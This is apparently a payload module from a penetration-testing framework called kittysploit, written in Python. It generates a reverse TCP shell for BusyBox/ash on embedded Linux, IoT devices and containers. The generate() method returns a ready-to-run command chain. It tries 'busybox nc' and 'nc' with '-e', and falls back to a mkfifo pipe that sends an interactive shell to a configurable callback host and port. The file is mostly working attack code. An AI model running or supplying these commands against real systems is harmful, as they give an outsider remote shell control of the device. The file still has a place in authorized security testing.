from kittysploit import *


class Module(Payload):

	CLIENT_LANGUAGE = "sh"

	__info__ = {
		"name": "BusyBox / ash Reverse TCP",
		"description": "Minimal reverse TCP shell for BusyBox/ash (IoT, containers, embedded Linux)",
		"category": PayloadCategory.CMD,
		"arch": Arch.CMD,
		"platform": Platform.LINUX,
		"listener": "listeners/multi/reverse_tcp",
		"handler": Handler.REVERSE,
		"session_type": SessionType.SHELL,
	}

	lhost = OptString("127.0.0.1", "Callback host", True)
	lport = OptPort(4444, "Callback port", True)
	shell = OptString("sh", "Shell binary (sh|ash|busybox sh)", False)

	def generate(self):
		host = str(self.lhost)
		port = int(self.lport)
		shell = str(self.shell or "sh").strip() or "sh"
		# BusyBox nc variants differ; try several patterns common on embedded.
		# Primary: /dev/tcp when bash; BusyBox often has nc or telnet.
		return (
			f"busybox nc {host} {port} -e {shell} 2>/dev/null || "
			f"nc {host} {port} -e {shell} 2>/dev/null || "
			f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {host} {port} >/tmp/f"
		)
